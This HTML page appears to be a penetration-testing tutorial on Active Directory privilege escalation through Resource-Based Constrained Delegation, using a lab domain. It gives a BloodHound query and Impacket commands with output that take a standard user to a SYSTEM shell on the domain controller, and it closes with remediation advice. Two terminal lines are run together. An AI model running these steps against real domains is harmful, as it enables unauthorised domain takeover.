<div class="content-card">
  <h2>🚀 The Executive Summary</h2>
  <p><strong>Resource-Based Constrained Delegation (RBCD)</strong> is a critical Active Directory misconfiguration that allows an attacker to escalate from a standard user to Domain Admin permissions.</p>
  <p>Unlike traditional attacks that require high privileges, RBCD exploits a subtle permission: <strong>Write access on a computer object.</strong></p>
</div>

<div class="content-card">
  <h2>🧠 The Attack Concept</h2>
  <div class="concept-box">
    <strong>The Core Vulnerability:</strong><br>
    The attribute <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> controls which services can impersonate users to a specific computer. If we can write to this attribute, we control who can access the machine.
  </div>

  <p>The attack relies on the <strong>Kerberos S4U (Service for User)</strong> extensions:</p>
  
  <div class="mermaid">
  sequenceDiagram
    participant Attacker as Attacker (EvilPC)
    participant KDC as Domain Controller
    participant Target as Target Server
    
    Note over Attacker: 1. S4U2Self
    Attacker->>KDC: "I need a ticket for Administrator to access myself"
    KDC-->>Attacker: TGS (Admin -> EvilPC)
    
    Note over Attacker: 2. S4U2Proxy
    Attacker->>KDC: "Admin wants to access Target via me. Can I get a ticket?"
    KDC-->>Attacker: TGS (Admin -> Target)
    
    Note over Attacker: 3. Execution
    Attacker->>Target: Access as Administrator!
  </div>
</div>

<div class="content-card">
  <h2>🔍 Phase 1: Reconnaissance</h2>
  <p>We use <strong>BloodHound</strong> to identify the vulnerability. We are looking for an edge that allows us to modify a computer object.</p>
  <div class="red-team-note">
    <strong>BloodHound Query:</strong><br>
    MATCH p=(u:User)-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
  </div>
  
</div>

<div class="content-card">
  <h2>⚔️ Phase 2: Exploitation</h2>
  <p><strong>Scenario:</strong> User <code>Stannis</code> has GenericWrite on <code>KINGSLANDING$</code> (DC).</p>

  <h3>Step A: Create the "Fake" Service</h3>
  <p>We need a service account to interact with Kerberos. We use the default <code>MachineAccountQuota</code> to create one.</p>
  <div class="terminal-box">
$ proxychains addcomputer.py domain/stannis:Pass -method LDAPS -computer-name EVILPC$
[+] EVILPC$ created successfully!
  </div>

  <h3>Step B: Weaponize the Target</h3>
  <p>We write our new computer's name into the target's delegation attribute.</p>
  <div class="terminal-box">
$ proxychains rbcd.py domain/stannis:Pass -delegate-from EVILPC$ -delegate-to KINGSLANDING$ -action write
[+] Attribute modified successfully.
  </div>

  <h3>Step C: The Kerberos Abuse</h3>
  <p>We request the impersonation ticket (S4U2Self + S4U2Proxy).</p>
  <div class="terminal-box">
$ proxychains getST.py domain/EVILPC$:Pass -spn cifs/kingslanding -impersonate Administrator
[*] Impersonating Administrator...
[+] Saving ticket to Administrator.ccache
  </div>
</div>

<div class="content-card" style="border-left-color: #27ae60;">
  <h2 style="color: #27ae60;">🏁 Phase 3: Domain Dominance</h2>
  <p>With the ticket in hand, we execute commands as <strong>SYSTEM</strong> on the Domain Controller.</p>
  <div class="terminal-box">
$export KRB5CCNAME=Administrator.ccache$ proxychains wmiexec.py domain/Administrator@kingslanding -k -no-pass

C:\Windows\system32> whoami
nt authority\system
  </div>
</div>

<div class="content-card">
  <h2>🛡️ Consultant's Corner: Remediation</h2>
  <p>How do we advise clients to fix this?</p>
  <ul>
    <li><strong>Restrict MachineAccountQuota:</strong> Set it to 0 so users cannot create the "Fake Service."</li>
    <li><strong>Tiered Administration:</strong> Ensure standard users do not have Write permissions on Tier 0 assets.</li>
    <li><strong>Monitoring:</strong> Alert on changes to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</li>
  </ul>
</div>
